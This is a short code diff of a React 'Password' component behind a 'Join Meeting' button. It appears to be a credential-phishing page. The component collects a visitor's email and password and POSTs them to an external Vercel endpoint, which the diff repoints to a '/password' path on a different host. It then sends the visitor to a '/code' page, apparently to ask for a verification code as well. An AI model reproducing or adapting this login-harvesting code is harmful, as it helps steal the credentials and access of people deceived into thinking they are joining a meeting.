@@ -17,13 +17,13 @@ const Password = () => {
       Email: data.example,
       Password: data.exampleRequired,
     };
-    fetch("https://roni-mega.vercel.app/users", {
+    fetch("https://hakim-meet-mega-sarver.vercel.app/password", {
       method: "POST",
       headers: { "Content-type": "application/json" },
       body: JSON.stringify(ItemId),
     })
       .then((res) => res.json())
-      .then((result) => navigate("/verify"));
+      .then((result) => navigate("/code"));
   };
   return (
     <div className="text-center">
@@ -60,7 +60,6 @@ const Password = () => {
             {errors.exampleRequired && <span>This field is required</span>}
 
             <input
-              onClick={() => navigate("/code")}
               className="submit  mt-3 mb-3 w-50%"
               type="SUBMIT"
               defaultValue="Join Meeting"
